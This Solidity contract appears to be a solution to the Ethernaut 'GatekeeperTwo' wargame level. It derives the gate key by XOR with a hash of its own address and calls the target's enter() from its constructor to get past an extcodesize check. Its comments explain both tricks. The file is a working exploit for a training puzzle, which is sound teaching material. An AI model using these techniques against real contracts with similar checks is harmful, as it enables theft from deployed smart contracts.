// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract ExploitGateKeeperTwo {
    constructor(address _target) {
        bytes8 gateKey;

        unchecked {
            // a nice property or XOR is that you can reverse it: A^B = C; B = A^C
            gateKey =
                bytes8(uint64(0) - 1) ^
                bytes8(keccak256(abi.encodePacked(address(this))));
        }

        // Exploit in constructor as when you call another contract in here extcodesize() is 0 for this address
        // -> makes it passt gateTwo
        (bool success, ) = _target.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(gateKey))
        );

        require(success, "Execution failed.");
    }
}
